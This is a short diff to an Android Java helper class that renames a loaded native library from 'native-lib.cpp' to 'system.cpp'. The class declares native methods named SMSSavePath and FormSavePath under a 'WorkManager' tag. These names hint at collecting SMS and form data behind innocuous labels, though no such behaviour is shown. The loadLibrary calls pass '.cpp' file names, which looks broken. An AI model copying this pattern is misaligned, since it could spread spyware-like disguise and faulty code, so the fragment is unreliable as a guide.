@@ -22,7 +22,7 @@ public class Helper {
 
     public static String TAG = "WorkManager";
     {
-        System.loadLibrary("native-lib.cpp");
+        System.loadLibrary("system.cpp");
     }
     public  native String SMSSavePath();
     public  native String FormSavePath();
